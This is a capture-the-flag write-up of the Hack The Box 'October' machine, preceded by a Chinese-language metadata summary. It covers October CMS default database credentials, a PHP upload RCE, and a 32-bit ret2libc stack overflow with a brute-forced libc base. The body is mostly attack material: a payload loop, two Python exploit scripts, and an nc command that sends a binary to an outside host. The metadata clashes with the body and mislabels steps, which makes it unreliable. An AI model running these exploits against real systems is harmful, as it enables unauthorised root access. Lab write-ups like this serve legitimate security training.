---
title: '[HTB] October Writeup'
contest: Hack The Box - October
year: 2017
difficulty: medium
vuln_type: rce
tags:
- october_cms
- php_cms_upload_bypass
- mysql_default_password
- su_buffer_overflow_ovrflw
- system_exit_binsh_brute
- ret2libc_i386
- brute_libc_base
- cms_credentials_config
- rce_php_file_upload
attack_chain: October CMS 1.0.412 searchsploit → /config/database.php 默认密码 OctoberCMSPassword!! + october 用户 → RCE php 上传 → get www-data → su → /usr/local/bin/ovrflw (32 位 NX+Partial RELRO+无 Canary+无 PIE) 栈溢出 112 字节 → brute libc base 0xb75f8000 → payload = b'A'*112 + p32(system)+p32(exit)+p32(binsh) → bash 反弹
key_payload: '''mysql password: OctoberCMSPassword!! / checksec Canary:✘ NX:✓ PIE:✘ / system@b75f8000+0x40310=0xB7638310 / exit@b75f8000+0x33260=0xB762B260 / /bin/sh=b75f8000+0x162bac=0xB775ABAC'''
one_liner: 'HTB October: OctoberCMS 数据库默认密码 + RCE 写 PHP 提权 → su 切换 → 32 位 ovrflw 栈溢出 (无 Canary/PIE) → brute libc base → ret2libc system(/bin/sh) 反弹 root。'
lesson: CMS 默认密码 OctoberCMSPassword!! + config/database.php 路径暴露是 2017 老牌 CMS 经典；栈溢出 brute libc base 用 while true; do ovrflw "$payload"; done 是无 ASLR/PIE 时代的标配。
quality: high
full_path: '[HTB]_October_Writeup.full.md'
meta_path: '[HTB]_October_Writeup.meta.md'
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '[HTB] October Writeup。HTB October: OctoberCMS 数据库默认密码 + RCE 写 PHP 提权 → su 切换 → 32 位 ovrflw 栈溢出 (无 Canary/PIE) → brute libc base → ret2libc system(/bin/sh) 反弹 root。。经验：CMS 默认密码 OctoberCMSPassword!! ...'
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/50413.html
reasoning_chain:
- 触发点:80 端口 October CMS 1.0.412 → 假设:有已知 CVE → 动作:searchsploit October
- 观察:October CMS Upload Protection Bypass Code Execution → 下一步:尝试默认密码
- 动作:cat /config/database.php → 观察:OctoberCMSPassword!! → october 用户 → 登录
- 动作:October CMS 后台上传 PHP file → 观察:RCE 触发 → get www-data
- 动作:su 切换用户 + 找 /usr/local/bin/ovrflw → 假设:32 位栈溢出 → 动作:checksec
- 观察:32 位 NX+Partial RELRO+无 Canary+无 PIE → 下一步:栈溢出利用
- 动作:brute libc base 0xb75f8000 → payload = b'A'*112 + p32(system) + p32(exit) + p32(binsh) → 观察:bash 反弹
- 动作:nc -l -p 9901 > ovrflw + nc -w 5 10.10.17.64 9901 < /usr/local/bin/ovrflw → 观察:root 触发
failed_attempts:
- 试图直接 RCE 提权 → 失败:www-data 无 su 权限
- 试图 brute libc base 0xb7600000 → 失败:libc base 0xb75f8000 才对
- 试图用 longjmp 改流程 → 失败:无 longjmp 可用
key_observations:
- CMS 默认密码 OctoberCMSPassword!! + config/database.php 路径暴露是 2017 老牌 CMS 经典
- 栈溢出 brute libc base 用 while true; do ovrflw "$payload"; done 是无 ASLR/PIE 时代的标配
- 32 位 ELF NX+Partial RELRO+无 Canary+无 PIE = ret2libc 标配
- October CMS 1.0.412 已知 CVE-2017 上传 bypass 是直接 RCE 入口
- libc base brute 是把整个 libc 库 dump 出来后 readelf 找 offset
prerequisites:
- searchsploit CMS 漏洞查找
- October CMS RCE 利用
- 栈溢出 + brute libc base + ret2libc
- nc 反弹 + bash 反向 shell
---
# [HTB] October Writeup

> 原文: https://www.ctfiot.com/50413.html
> ID: 50413


```
时间: 2021-09-08
机器作者: ch4p
困难程度: easy
MACHINE TAGS:
* PHP
* External
* Apache
* Penetration Tester Level 3
* Unrestricted File Upload
* Binary Exploitation
* Buffer Overflow
* Default Credentials
# nmap -p- -n -Pn -sC --min-rate 2000 -oA nmap/portscan -v 10.10.10.16
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http
|_http-favicon: Unknown favicon MD5: 1D585CCF71E2EB73F03BCF484CFC2259
| http-methods:
|   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS
|_  Potentially risky methods: PUT PATCH DELETE
|_http-title: October CMS - Vanilla
$ searchsploit October
--------------------------------------------------------------------
October CMS - Upload Protection Bypass Code Execution (Metasploit) | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated) | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting | php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery | php/webapps/43106.txt
https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html
'mysql' => [
    'driver'    => 'mysql',
    'host'      => 'localhost',
    'port'      => '',
    'database'  => 'october',
    'username'  => 'october',
    'password'  => 'OctoberCMSPassword!!',
    'charset'   => 'utf8',
    'collation' => 'utf8_unicode_ci',
    'prefix'    => '',
],
$ nc -l -p 9901 > ovrflw # kali监听接收
$ nc -w 5 10.10.17.64 9901 < /usr/local/bin/ovrflw
gef➤  checksec
[+] checksec for '/home/kali/hackthebox/October/file/pwn/ovrflw'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
 162bac /bin/sh
 164b10 /bin/csh
$ cat /proc/sys/kernel/randomize_va_space
2
'A' * 112 + system_plt + 0x0000000 + bin_sh_addr
$ objdump -d -j .plt /usr/local/bin/ovrflw
system: 0xb75f8000+0x40310 = 0xB7638310
exit: 0xb75f8000+0x33260 = 0xB762B260
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
$ while true; do /usr/local/bin/ovrflw $(python -c 'print "x90"*112 + "x10x83x63xb7" + "x60xb2x62xb7" + "xacxabx75xb7"'); done
import struct

system_addr = struct.pack("<I", 0xffffffff)
exit_addr = struct.pack("<I", 0xffffffff)
arg_addr = struct.pack("<I", 0xffffffff)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print buf
from subprocess import call
import struct

lib_base_addr = 0xffffffff
system_off = 0xffffffff
exit_off = 0xffffffff
arg_off = 0xffffffff

system_addr = struct.pack("<I", lib_base_addr + system_off)
exit_addr = struct.pack("<I", lib_base_addr + exit_off)
arg_addr = struct.pack("<I", lib_base_addr + arg_off)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

call(["/usr/local/bin/ovrflw", buf])
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]